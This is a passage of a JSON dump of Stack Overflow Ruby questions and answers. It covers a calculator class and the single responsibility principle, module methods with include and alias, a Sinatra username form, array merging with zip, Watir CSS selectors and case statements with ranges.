this:</p>\n\n<pre><code>class Calculator\n\n  attr_reader :report\n\n  def initialize(parameter_1, reporting=false)\n    @parameter_1 = parameter_1\n    @reporting = reporting\n    @report = {}\n  end\n\n  def output \n    op_1_result = operation_1(@parameter_1)\n    @report[:op_1_result] = op_1_result if @reporting\n\n    op_2_result = operation_2(op_1_result)\n    @report[:op_2_result] = op_2_result if @reporting\n\n    operation_3(op_2_result)\n  end\n\n  def operation_1(param)\n  ...\n\nend\n</code></pre>\n\n<p>Then, when I want to get those intermediate variables, I would:</p>\n\n<pre><code>calculator = Calculator.new(1234, true) # reporting activated\nreport = calculator.report\n\nreport[:op_1_result] # one of the intermediate variables of the calculation\n</code></pre>\n\n<p>Does this break the single responsibility principle, as the class is now calculating the value and reporting at the same time? </p>\n\n<p>Is there a better way to do this, a design pattern where I could have a fast calculation of the output result where it is needed and show the report where needed without all those ifs?</p>\n\n<p>Any light on this and comments will be really appreciated!</p>\n\n<hr>\n\n<p>Obs (another discussion): I've read that a more functional approach to just outputting a value would be a great thing. But that kept me wondering about how to show those internal intermediate values when needed. How do more functional programmers would do it...?</p>\n"}, {"tags": ["ruby", "oop"], "answers": [{"comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1511903507, "post_id": 47540142, "comment_id": 82039156, "body": "A lot of tutorials make Ruby mixins extremely complicated, and I really don&#39;t understand why. <code>include</code> makes the mixin the superclass. And that&#39;s it. There&#39;s literally nothing more to understand about Ruby mixins. It&#39;s just standard boring old inheritance."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "reply_to_user": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1511910181, "post_id": 47540142, "comment_id": 82041904, "body": "@J&#246;rgWMittag The confusing thing about them is if you&#39;ve never used a language that allows this kind of selective composition. Most people are used to single or multiple inheritance, and those are usually locked in at the time of definition. With <code>include</code> you can add additional &quot;superclass&quot; type inheritance arbitrarily at any time. That seems very odd at first, like how you can also do that on individual objects."}], "tags": [], "owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "is_accepted": false, "score": 2, "last_activity_date": 1511899971, "creation_date": 1511899971, "answer_id": 47540142, "question_id": 47540051, "link": "https://stackoverflow.com/questions/47540051/how-can-i-call-a-class-method-on-its-instance/47540142#47540142", "title": "How can I call a class method on its instance?", "body": "<p>There's a couple of things to keep in mind here:</p>\n\n<ul>\n<li>If you declare module methods with the <code>self</code> prefix that means they're able to be directly called on the module, like <code>A.a1</code>, but it also means they <em>won't</em> be imported with <code>include</code>. Those declared without self are \"mix-in methods\", or those that will automatically be imported on <code>include</code>.</li>\n<li>If you <code>include</code> more than one module which defines a method then the last module included will be the one that actually gets called.</li>\n</ul>\n\n<p>The fix here is either to change <code>def self.a1</code> to <code>def a1</code> in <code>module A</code> or instead call it directly with <code>A.a1</code>. If B also defines <code>a1</code> then it will have precedence <em>unless</em> you <code>include B</code> first, making it lower priority.</p>\n"}, {"tags": [], "owner": {"reputation": 9971, "user_id": 8255744, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de22299534b5a8ed244ee8ff4aa6c481?s=128&d=identicon&r=PG&f=1", "display_name": "Simple Lime", "link": "https://stackoverflow.com/users/8255744/simple-lime"}, "is_accepted": false, "score": 0, "last_activity_date": 1511913390, "creation_date": 1511913390, "answer_id": 47542922, "question_id": 47540051, "link": "https://stackoverflow.com/questions/47540051/how-can-i-call-a-class-method-on-its-instance/47542922#47542922", "title": "How can I call a class method on its instance?", "body": "<p>If you know this sort of thing will happen ahead of time, you can use alias as you're including modules (note this changes the method definitions from <code>def self.a1</code> to <code>def a1</code> so that they are properly included as instance methods):</p>\n\n<pre><code>module A\n  def a1\n    puts \"I am defined in A\"\n  end\nend\n\nmodule B\n  def a1\n    puts \"I am defined in B\"\n  end\nend\n\nclass Sample\n  include A\n  alias :a_a1 :a1\n  include B\n  alias :b_a1 :a1\nend\n\nsamp = Sample.new\nsamp.a_a1\nsamp.b_a1\nsamp.a1\n</code></pre>\n\n<p>running this outputs:</p>\n\n<pre><code>I am defined in A\nI am defined in B\nI am defined in B\n</code></pre>\n\n<p>As a general rule, though, I would avoid this situation and rename one of the methods in the modules, if you're able to; though sometimes you're not able to for one reason or another.</p>\n"}, {"comments": [{"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 1, "creation_date": 1511927693, "post_id": 47544757, "comment_id": 82046450, "body": "This won&#39;t work with <code>include</code> - you would need to <code>extend</code> instead."}], "tags": [], "owner": {"reputation": 71, "user_id": 2888720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0544a9fdecc937832ae333a955e8817?s=128&d=identicon&r=PG&f=1", "display_name": "Stephen Amsel", "link": "https://stackoverflow.com/users/2888720/stephen-amsel"}, "is_accepted": false, "score": 0, "last_activity_date": 1511927524, "creation_date": 1511927524, "answer_id": 47544757, "question_id": 47540051, "link": "https://stackoverflow.com/questions/47540051/how-can-i-call-a-class-method-on-its-instance/47544757#47544757", "title": "How can I call a class method on its instance?", "body": "<p>If it's just for a1, then this should work:</p>\n\n<pre><code>class Sample\n  include A\n  def a1\n    self.class.a1\n  end\nend\n</code></pre>\n\n<p>If you need it for all methods, you can try Catching the NoMethodError with a send-command for the class, but that is usually overkill.</p>\n"}], "owner": {"reputation": 3, "user_id": 9012967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/860a2196720da09d85a8e09dde0719b5?s=128&d=identicon&r=PG&f=1", "display_name": "Namit Srivastava", "link": "https://stackoverflow.com/users/9012967/namit-srivastava"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1511927524, "creation_date": 1511899637, "last_edit_date": 1511925451, "question_id": 47540051, "link": "https://stackoverflow.com/questions/47540051/how-can-i-call-a-class-method-on-its-instance", "title": "How can I call a class method on its instance?", "body": "<p><code>a1</code> is a method on <code>A</code>.</p>\n\n<pre><code>module A\n  def self.a1\n    puts \"I am defined in A\"\n  end\nend\n\nclass Sample\n  include A\nend\n\nsamp = Sample.new\n</code></pre>\n\n<p>How can I call <code>samp.a1</code>?</p>\n\n<pre><code>puts samp.a1\n</code></pre>\n"}, {"tags": ["ruby", "html", "sqlite", "sinatra"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511911876, "post_id": 47539933, "comment_id": 82042438, "body": "Don&#39;t forget to indent your code properly especially when asking here. It communicates structure and intent."}, {"owner": {"reputation": 67, "user_id": 8826153, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5fea90c40c56a9052523f185fcfb5709?s=128&d=identicon&r=PG&f=1", "display_name": "msc", "link": "https://stackoverflow.com/users/8826153/msc"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1512057129, "post_id": 47539933, "comment_id": 82111780, "body": "I solved the problem, nvm"}], "owner": {"reputation": 67, "user_id": 8826153, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5fea90c40c56a9052523f185fcfb5709?s=128&d=identicon&r=PG&f=1", "display_name": "msc", "link": "https://stackoverflow.com/users/8826153/msc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 31, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1511899145, "creation_date": 1511899145, "question_id": 47539933, "link": "https://stackoverflow.com/questions/47539933/add-usernames-to-database", "title": "Add usernames to database", "body": "<p>I have this line in an .erb file to get the input of the username</p>\n\n<pre><code>&lt;input type=\"text\" placeholder=\"User Name\" name=\"user[username]\" value=\"&lt;%#{@user.username}%&gt;\" class=\"form-control\"&gt;\n</code></pre>\n\n<p>for my User.rb class I have the following:</p>\n\n<pre><code>class User\ninclude DataMapper::Resource\nproperty :id, Serial\nproperty :username, String\nproperty :password, String\nproperty :role, String\nend\nDataMapper.finalize()\n\nget '/users' do\n@users = User.all\nerb :users\n</code></pre>\n\n<p>Within users.erb I have the following</p>\n\n<pre><code>&lt;div class=\"container\"&gt;\n&lt;h3&gt;Users&lt;/h3&gt;\n&lt;% if @users.any? %&gt;\n  &lt;ul &lt;%#users%&gt;&gt;\n    &lt;% @users.each do |user|%&gt;\n         &lt;li&gt;&lt;%#{user.username}%&gt;&lt;/li&gt;\n    &lt;%end%&gt;\n &lt;%else%&gt;\n  &lt;p&gt;No Users in database&lt;/p&gt;\n &lt;%end%&gt;\n &lt;/ul&gt;\n &lt;/div&gt;\n</code></pre>\n\n<p>I want the to login a user and have that username stored in the database and then display that on the users page but it just keeps getting the else statement and I don't know why</p>\n"}, {"tags": ["arrays", "ruby"], "comments": [{"owner": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "edited": false, "score": 0, "creation_date": 1511898475, "post_id": 47539579, "comment_id": 82036454, "body": "Use <code>zip</code> with <code>map</code>. Or <code>map.with_index</code> on <code>a1</code> referencing <code>a2</code> with the block index parameter."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511902626, "post_id": 47539579, "comment_id": 82038710, "body": "You could improve your example by making the elements more varied. For example, <code>a1 = [[0,1], [2,3],[4,5]]</code> and <code>a2 = [6,7,8]</code>. Also, it&#39;s best to ask for a specific return value for your example, rather than &quot;this or that&quot;. If you specify &quot;this&quot;, the return value for &quot;that&quot; can often be easily deduced."}], "answers": [{"comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511902778, "post_id": 47540224, "comment_id": 82038801, "body": "Consider putting that in the form of a method <code>def m(a1,a2,a1_index)...</code>."}, {"owner": {"reputation": 33, "user_id": 8432498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/674d8686985992da186baa2eb2aa1eec?s=128&d=identicon&r=PG&f=1", "display_name": "safikabis", "link": "https://stackoverflow.com/users/8432498/safikabis"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511965508, "post_id": 47540224, "comment_id": 82066871, "body": "@CarySwoveland thanks, that was exactly what I needed"}], "tags": [], "owner": {"reputation": 42085, "user_id": 3444240, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/OjOru.jpg?s=128&g=1", "display_name": "potashin", "link": "https://stackoverflow.com/users/3444240/potashin"}, "is_accepted": true, "score": 2, "last_activity_date": 1511900313, "creation_date": 1511900313, "answer_id": 47540224, "question_id": 47539579, "link": "https://stackoverflow.com/questions/47539579/merge-nested-array-and-regular-array-by-first-element/47540224#47540224", "title": "Merge nested array and regular array by first element", "body": "<p>You can use <code>map</code> (with <code>first</code> or <code>last</code>, depending on which element from <code>a1</code> you want to fetch) and <code>zip</code></p>\n\n<pre><code>a1.map(&amp;:first).zip(a2)\n# =&gt; [[0, 1], [0, 1], [0, 1]]\n</code></pre>\n\n<p><a href=\"https://repl.it/repls/BigheartedMustyTrex\" rel=\"nofollow noreferrer\"><strong>Demonstration</strong></a></p>\n"}], "owner": {"reputation": 33, "user_id": 8432498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/674d8686985992da186baa2eb2aa1eec?s=128&d=identicon&r=PG&f=1", "display_name": "safikabis", "link": "https://stackoverflow.com/users/8432498/safikabis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "accepted_answer_id": 47540224, "answer_count": 1, "score": 1, "last_activity_date": 1512260738, "creation_date": 1511897827, "last_edit_date": 1512260738, "question_id": 47539579, "link": "https://stackoverflow.com/questions/47539579/merge-nested-array-and-regular-array-by-first-element", "title": "Merge nested array and regular array by first element", "body": "<p>I am trying to merge a regular array array into a nested array such that a given element of a row in the nested array is replaced with each element in the regular array but can't compile the logic into a method e.g:</p>\n\n<pre><code>a1 = [[0,0], [0,0], [0,0]]\n\na2 = [1,1,1]\n\n=&gt; [[1, 0], [1, 0], [1, 0]] or [[0, 1], [0, 1], [0, 1]]\n</code></pre>\n\n<p>So far I have:</p>\n\n<pre><code> a1[0][0, a2[0]] = a2[0]\n a1[1][0, a2[1]] = a2[1]\n a1[2][0, a2[1]] = a2[2]\n</code></pre>\n\n<p>Which gives the required result but this needs to be wrapped in a method such that any array sizes can be used.</p>\n"}, {"tags": ["javascript", "ruby", "selenium", "automation", "watir"], "comments": [{"owner": {"reputation": 162909, "user_id": 1175966, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d3d9dfbd040f9cbc1a6b82f0da2b345?s=128&d=identicon&r=PG", "display_name": "charlietfl", "link": "https://stackoverflow.com/users/1175966/charlietfl"}, "edited": false, "score": 0, "creation_date": 1511895341, "post_id": 47538888, "comment_id": 82034761, "body": "depends on page structure most notably any classes or ID&#39;s along that path. If you are writing that manually I&#39;m sure you could clean it up a lot. I have written things like that but programmatically walking up the dom to create them and only because of not being in charge of the structure"}, {"owner": {"reputation": 46893, "user_id": 4549554, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/Vxi1i.jpg?s=128&g=1", "display_name": "Andersson", "link": "https://stackoverflow.com/users/4549554/andersson"}, "edited": false, "score": 3, "creation_date": 1511895399, "post_id": 47538888, "comment_id": 82034798, "body": "Share HTML code sample for the same"}, {"owner": {"reputation": 1896, "user_id": 4464220, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9bebf779f5937d9ec72bd32fa29172b2?s=128&d=identicon&r=PG&f=1", "display_name": "Ali Azam", "link": "https://stackoverflow.com/users/4464220/ali-azam"}, "edited": false, "score": 0, "creation_date": 1511895635, "post_id": 47538888, "comment_id": 82034919, "body": "Can you share your html sample?"}, {"owner": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "edited": false, "score": 0, "creation_date": 1511896305, "post_id": 47538888, "comment_id": 82035272, "body": "One goal of Watir is to make it so that you don&#39;t need to use XPath to locate your elements. If the element you are looking for is an input, you shouldn&#39;t need to drill down that much to find it. Depending on what inputs you have on the page, how close does this get you? <code>browser.div(id: &#47;^customswindow-&#47;).input</code>"}, {"owner": {"reputation": 116545, "user_id": 7429447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a25589e600c8ae89717c14e51a6754b?s=128&d=identicon&r=PG&f=1", "display_name": "DebanjanB", "link": "https://stackoverflow.com/users/7429447/debanjanb"}, "reply_to_user": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "edited": false, "score": 0, "creation_date": 1511896607, "post_id": 47538888, "comment_id": 82035435, "body": "@titusfortner I think a logical <code>css</code> or <code>xpath</code> does the same."}, {"owner": {"reputation": 2054, "user_id": 4468132, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/IHE5A.jpg?s=128&g=1", "display_name": "Gardezi", "link": "https://stackoverflow.com/users/4468132/gardezi"}, "edited": false, "score": 0, "creation_date": 1511897129, "post_id": 47538888, "comment_id": 82035745, "body": "please share the html sample"}, {"owner": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "edited": false, "score": 0, "creation_date": 1511897292, "post_id": 47538888, "comment_id": 82035844, "body": "Does the same as what? Obviously there are tons of ways of locating elements. I&#39;m saying Watir specifically tries to make it such that users can avoid that kind of ugliness/insanity with more easy to read approaches. Using Watir while ignoring what it is good at is suboptimal."}, {"owner": {"reputation": 116545, "user_id": 7429447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a25589e600c8ae89717c14e51a6754b?s=128&d=identicon&r=PG&f=1", "display_name": "DebanjanB", "link": "https://stackoverflow.com/users/7429447/debanjanb"}, "reply_to_user": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "edited": false, "score": 0, "creation_date": 1511900808, "post_id": 47538888, "comment_id": 82037679, "body": "@titusfortner Definitely when I&#39;m speaking about <code>xpath</code> &amp; <code>css</code> I mean Selenium Locators business. I wonder in which perspective did you find such ugliness/insanity here. Watir as I understand is just a wrapper against diverse waits"}, {"owner": {"reputation": 6589, "user_id": 409820, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b01ab32f3a9016b9e2ade35f3aeb4023?s=128&d=identicon&r=PG", "display_name": "Chuck van der Linden", "link": "https://stackoverflow.com/users/409820/chuck-van-der-linden"}, "reply_to_user": {"reputation": 116545, "user_id": 7429447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a25589e600c8ae89717c14e51a6754b?s=128&d=identicon&r=PG&f=1", "display_name": "DebanjanB", "link": "https://stackoverflow.com/users/7429447/debanjanb"}, "edited": false, "score": 0, "creation_date": 1511982393, "post_id": 47538888, "comment_id": 82077649, "body": "Then you really misunderstand what Watir is @DebanjanB"}, {"owner": {"reputation": 6589, "user_id": 409820, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b01ab32f3a9016b9e2ade35f3aeb4023?s=128&d=identicon&r=PG", "display_name": "Chuck van der Linden", "link": "https://stackoverflow.com/users/409820/chuck-van-der-linden"}, "edited": false, "score": 0, "creation_date": 1511982550, "post_id": 47538888, "comment_id": 82077727, "body": "@Eng80lvl  please edit your question to include a sample of the HTML around the element you wish to identify."}, {"owner": {"reputation": 6589, "user_id": 409820, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b01ab32f3a9016b9e2ade35f3aeb4023?s=128&d=identicon&r=PG", "display_name": "Chuck van der Linden", "link": "https://stackoverflow.com/users/409820/chuck-van-der-linden"}, "edited": false, "score": 0, "creation_date": 1512678247, "post_id": 47538888, "comment_id": 82366484, "body": "downvoted due to lack of response from original poster"}], "answers": [{"tags": [], "owner": {"reputation": 116545, "user_id": 7429447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a25589e600c8ae89717c14e51a6754b?s=128&d=identicon&r=PG&f=1", "display_name": "DebanjanB", "link": "https://stackoverflow.com/users/7429447/debanjanb"}, "is_accepted": false, "score": 0, "last_activity_date": 1511933146, "creation_date": 1511933146, "answer_id": 47545649, "question_id": 47538888, "link": "https://stackoverflow.com/questions/47538888/locating-element-in-dom-for-automated-test-case/47545649#47545649", "title": "Locating element in DOM for automated test case", "body": "<p>Well, there is no Best Practices defined when solving a task/problem. Having said that, the <code>cssSelector</code> which you have used is based on it's <code>Absolute Path</code>. <code>cssSelector</code> and <code>xpath</code> based on <code>Absolute Path</code> tends to be brittle. Hence we need to construct <code>Logical Path</code>.</p>\n\n<p>So inspite of the <code>cssSelector</code> you have used as :</p>\n\n<pre><code>div[id^=customswindow-][id$=-body]&gt;div&gt;div:nth-child(3)&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;input\n</code></pre>\n\n<p>I would suggest to start looking only at the <code>&lt;input&gt;</code> tags with its attributes. You can use any of the approaches as mentioned below :</p>\n\n<pre><code>//using id and other attribute\ninput#id[attribute=value]\n\n//using classname and other attribute\ninput.classname[attribute=value]\n\n//using id, classname and other attribute\ninput#id.classname[attribute=value]\n\n//using three different attributes\ninput[attribute1=value][attribute2=value][attribute3=value]\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 9021933, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c699040b7b1d8339aa0bd1f6f5f7fb4c?s=128&d=identicon&r=PG&f=1", "display_name": "Eng80lvl", "link": "https://stackoverflow.com/users/9021933/eng80lvl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 72, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1511933146, "creation_date": 1511895063, "last_edit_date": 1511914450, "question_id": 47538888, "link": "https://stackoverflow.com/questions/47538888/locating-element-in-dom-for-automated-test-case", "title": "Locating element in DOM for automated test case", "body": "<p>To locate element in DOM, I am using the following path:</p>\n\n<pre><code> div[id^=customswindow-][id$=-body]&gt;div&gt;div:nth-child(3)&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;div&gt;input\n</code></pre>\n\n<p>Is there a way to shrink sequence of divs? <strong>div>div>div>div>div>div>div>div>div>div>div>div></strong></p>\n"}, {"tags": ["ruby", "switch-statement"], "comments": [{"owner": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "edited": false, "score": 1, "creation_date": 1511898066, "post_id": 47538886, "comment_id": 82036256, "body": "As well as <a href=\"http://ruby-doc.org/core-2.4.2/Range.html#method-i-include-3F\" rel=\"nofollow noreferrer\"><code>include?</code></a> which has already been mentioned, <a href=\"http://ruby-doc.org/core-2.4.2/Range.html#method-i-cover-3F\" rel=\"nofollow noreferrer\"><code>cover?</code></a> and <a href=\"http://ruby-doc.org/core-2.4.2/Comparable.html#method-i-between-3F\" rel=\"nofollow noreferrer\"><code>between?</code></a> may also be of interest."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 8207059, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cRFIIYFPcHo/AAAAAAAAAAI/AAAAAAAAAQQ/Xky0ucXT7rg/photo.jpg?sz=128", "display_name": "George Tucker", "link": "https://stackoverflow.com/users/8207059/george-tucker"}, "edited": false, "score": 1, "creation_date": 1511984978, "post_id": 47539369, "comment_id": 82079019, "body": "I really like the way you&#39;re evaluating the statements to determine what they <i>really</i> say -- truly helpful."}], "tags": [], "owner": {"reputation": 71199, "user_id": 1301972, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/T5G7N.jpg?s=128&g=1", "display_name": "Todd A. Jacobs", "link": "https://stackoverflow.com/users/1301972/todd-a-jacobs"}, "is_accepted": false, "score": 2, "last_activity_date": 1511897073, "creation_date": 1511897073, "answer_id": 47539369, "question_id": 47538886, "link": "https://stackoverflow.com/questions/47538886/using-case-with-multiple-conditions/47539369#47539369", "title": "Using &#39;case&#39; with multiple conditions", "body": "<h2>Case Statements, Expressions, and Case Equality</h2>\n\n<p>The when-statement doesn't really work the way you seem to think, and neither does an array literal. In its basic form, <code>case</code> compares a top-level expression to the expressions in a when statement using the threequals operator (<code>===</code>).</p>\n\n<p>In Ruby, almost everything is an expression. In your example, you're trying to match an array of values to an array that resolves to a single-element array. Consider:</p>\n\n<pre><code>[1..3 &amp;&amp; 2]\n#=&gt; [1..2]\n\n[1..3 &amp;&amp; 2].count\n#=&gt; 1\n\n[1..3 &amp;&amp; 2].map &amp;:class\n#=&gt; [Range]\n</code></pre>\n\n<p>Basically, your top-level array never matches any of the array expressions you're providing as conditions. What you want is probably something like this:</p>\n\n<pre><code>result = case\nwhen (1..3).include?(roll1) &amp;&amp; roll2.eql?(1)\n  \"Low / Low\"\nelse\n  raise \"invalid comparison\"\nend\n</code></pre>\n\n<p>In this type of construction, you're not using a threequals expression with a top-level value to compare against. Instead, you're constructing a truthy or falsey Boolean from a pair of expressions. Flesh this out with additional when statements, and then debug your expressions if you're still getting invalid comparisons.</p>\n"}, {"comments": [{"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511899310, "post_id": 47539446, "comment_id": 82036891, "body": "Would it be a bad idea to monkey patch <code>===</code> to <code>Array</code> (so that elements are compared with <code>===</code>) and to then use <code>when [1..3, 2]</code>?"}, {"owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "reply_to_user": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511899498, "post_id": 47539446, "comment_id": 82037006, "body": "@StefanPochmann I&#39;d tend to say that monkey patching to change standard behavior is a bad idea, monkey patching to add methods tends to be less of a bad idea. Debugging a NoMethodError is usually easy, debugging an operator that isn&#39;t behaving normally is a little harder. I didn&#39;t mention that option because the OP is new at Ruby and monkey is dangerous."}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511899883, "post_id": 47539446, "comment_id": 82037209, "body": "Ok, thanks. I&#39;m also new at Ruby, that&#39;s why I was wondering. I had already done it just to see whether I can, but I lack the judgement of whether it&#39;s good. And now I agree, changing existing behavior like this is probably bad."}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 1, "creation_date": 1511900734, "post_id": 47539446, "comment_id": 82037644, "body": "Hmm... what do you think about adding that <code>===</code> in a <i>subclass</i> and then using <code>when Case[1..3, 1]</code>? Demo: <a href=\"https://ideone.com/Xq6qd7\" rel=\"nofollow noreferrer\">ideone.com/Xq6qd7</a>"}, {"owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "reply_to_user": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": 